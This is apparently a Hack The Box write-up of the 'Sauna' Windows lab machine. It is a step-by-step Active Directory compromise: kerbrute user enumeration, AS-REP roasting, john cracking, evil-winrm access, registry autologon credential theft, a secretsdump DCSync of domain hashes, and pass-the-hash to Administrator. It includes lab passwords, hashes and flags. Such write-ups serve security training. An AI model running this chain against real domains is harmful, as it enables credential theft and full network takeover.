# Sauna

* **Level**: Easy
* **Operating System**: Windows

<br />

### Enumeration

<br />

Start off with a detailed nmap scan
```
nmap -sC -sV -Pn -p- 10.10.10.175


PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 10:59:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Defaul>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Defaul>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
64562/tcp open  msrpc         Microsoft Windows RPC

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerpri>
SF-Port53-TCP:V=7.70%I=7%D=2/15%Time=5E48AFB1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h01m24s, deviation: 0s, median: 8h01m24s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-02-16 06:01:33
|_  start_date: N/A

```

<br />

Quite a few ports open.  Notice that we got the domain name, EGOTISTICAL-BANK.LOCAL.  We might need this later.  Let's start with the low hanging fruit and see if we can connect via SMB:
```
smbclient -L //10.10.10.175/ -U ""
smbclient -L //10.10.10.175/ -U "guest"%
```

<br />

Both of these attempts failed, so we cannot authenticate with a null session or guest account.   Let's try gather more information with enum4linux: 
```
enum4linux -A 10.10.10.172
```

<br />

Still did not get anything worthwhile.  Lets take a look at what the webserver is hosting:
```
http://10.10.10.175/
```
![website](https://github.com/eesantiago/Writeups/blob/master/hack_the_box/machines/sauna/screenshots/website.png)


<br />

Looks like a banking website.  I checked all of the links and found a page containing potential usernames:
```
http://10.10.10.175/about.html
```
![team](https://github.com/eesantiago/Writeups/blob/master/hack_the_box/machines/sauna/screenshots/team.png)

<br />

I compiled these usernames into a list using a [guide on active directory naming conventions](https://activedirectorypro.com/active-directory-user-naming-convention/), which breaks down three ways to organize names:
	1. Complete first name plus last name
	2. Initial of first name and complete last name 
	3. First three characters of the first name and first three of last name

I did each of these options with and without periods separating the first and last name.   So for Fergus Smith, his options looked like this 

	1. Fergus.Smith
	2. FergusSmith
	3. F.Smith
	4. Fsmith
	5. FerSmi
	6. Fer.Smi

Now do that for all six people.

Just to be sure that I did not miss any usernames, I used Cewl to scrape the website for potential usernames and passwords:
```
cewl -d 2 -m 5 -w cewl.txt http://10.10.10.175/index.html
```

<br />

Now I combined the cewl list with the user list that I made into a users.txt file.  Since port 88 is open, we know that this machine is running kerberos.  Therefore, we can try to brute-force kerberos authentication.  Kerberos pre-authentication failure is not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).  This will also verify if any usernames in our list are correct and if any of those accounts do not require pre-authentication, which can be useful to perform an [ASREPRoast attack](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/).

When  [pre-authentication is not enforced](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx), a malicious attacker can directly send a dummy request for authentication. The Kerberos Distribution Center will return an encrypted Ticket Granting Ticket containing a session  key encrypted with the user's password hash which the attacker can brute force it offline.

To brute force Kerberos, we use [kerbrute](https://github.com/TarlogicSecurity/kerbrute).  We will use the file with the usernames that  and a passwords file (rockyou.txt).  Using that file let's try to use kerbrute to bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication: 
```
python /opt/kerbrute.py -domain EGOTISTICAL-BANK.LOCAL -dc-ip 10.10.10.175 -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile sauna_passwords.txt

[*] Valid user => sauna
[*] Valid user => FSmith [NOT PREAUTH]
```
Looks like user FSmith does not require pre-authentication.  Now we can send an AS_REQ request to the KDC on behalf of FSmith, and receive an [AS_REP message](https://www.tarlogic.com/en/blog/how-kerberos-works/). This last kind of message should contain a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password can be cracked offline.

<br />

### Exploitation

<br />

The impacket script GetNPUsers.py can be used from a Linux machine in order to harvest the non-preauth AS_REP responses.  We use a file with the username Fsmith  in it and output the password hash in a format that can be cracked by john:
```
python /opt/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile docswords.txt -format john -outputfile hashes.txt
```

<br />


Once it is complete, verify that the file contains a password hash for FSmith:
```
cat hashes.txt

$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:26dce2496172a25278f91a7a33b16d54$fae5ff8764f66858ce4d5ff9825762cfaefdfc191d731011be1b8c77e81286e66861b403b98ffb3714475b0a45cba8cf79ec603514bcc3e3fb3483d3146b12a4125d76698c36f5c9d6c528e7f7215afb48a1cb3e3f8c5f232dc183fd66eb01ca4c6b95daa2be489fabdc4f1763e934307e87c052e5233ac9bd71d0c5c7461b85c9d0928b3fc24b976490d72838695daee5e44700f98aecea24f995666d157c3762d2982a4995260018a40703f6e37168b3723d4e85219e73d03d54f3c3834007d4eea1f943fd87d708d7d58a2ae6407c00ba1bc1eb9cff700aa8bad7d29f8110f36e6ba20ec47a42ac0400c724fa5bd8910222132d5d257d4f4ea83aa5df937d
```

<br />

Now attempt to crack the password with john:
```
john --format:krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt Sauna_hashes.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMA>
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:14 DONE (2020-02-16 15:18) 0.06944g/s 731875p/s 731875c/s 731875C/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<br />

Now we have credentials Fsmith:Thestrokes23.  Let's use these credentials to list shares available on the server:
```
smbmap -H 10.10.10.175 -u FSmith -p Thestrokes23

[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.175...
[+] IP: 10.10.10.175:445        Name: 10.10.10.175
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
        NETLOGON                                                READ ONLY
        print$                                                  READ ONLY
        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS
        SYSVOL                                                  READ ONLY
```

<br />

Now list out the content of each of the shares that we have access to:
```
smbmap -R print$ -H 10.10.10.175 -u FSmith -p Thestrokes23
smbmap -R NETLOGON -H 10.10.10.175 -u FSmith -p Thestrokes23
smbmap -R SYSVOL -H 10.10.10.175 -u FSmith -p Thestrokes23
```

<br />

I did not find any useful information in the shares, so I tried to access the server with Windows Remote Management (WinRM) on port 5985 using [evil-winrm](https://github.com/Hackplayers/evil-winrm):
```
ruby evil-winrm.rb -i 10.10.10.175 -u FSmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Evil-WinRM PS C:\Users\FSmith\Documents> 
```

Grab the user.txt file:
```
PS C:\Users\FSmith\Documents> cat ..\Desktop\user.txt

1b5520b98d97cf17f24122a55baf70cf
```

<br />

### Privilege Escalation 

<br />


I started going through a [windows local privilege escalation checklist](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation).  Looking at the registry, I found that automatic logon was enabled can contained a cleartext username and password: 
```
PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x303697c4
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

```

Now we have the credentials svc_loanmanager:Moneymakestheworldgoround!.  This looks to be the credentials for the svc_loanmgr account:
```
PS > net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

<br /> 

I checked out the permissions for this user to see if he had anything special:
```
PS C:\Users\svc_loanmgr\Documents> net user /domain svc_loanmgr

User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 4:48:31 PM
Password expires             Never
Password changeable          1/25/2020 4:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

<br />

Looks like this user is a domain user.  We can now use the [impacket secretsdump.py script to remotely dump password hashes](https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633):
```
python secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175

Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
[*] Cleaning up... 
```

<br />

Since we have captured Adminstrator NTLM hashes, we can [pass-the-hash](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/#pth-toolkit-and-impacket) with impacket's wmiexec script:
```
python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175

Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

<br />

And now with system level privileges we can access root.txt:
```
C:\Users\Administrator\Desktop>type root.txt

f3ee04965c68257382e31502cc5e881f
```


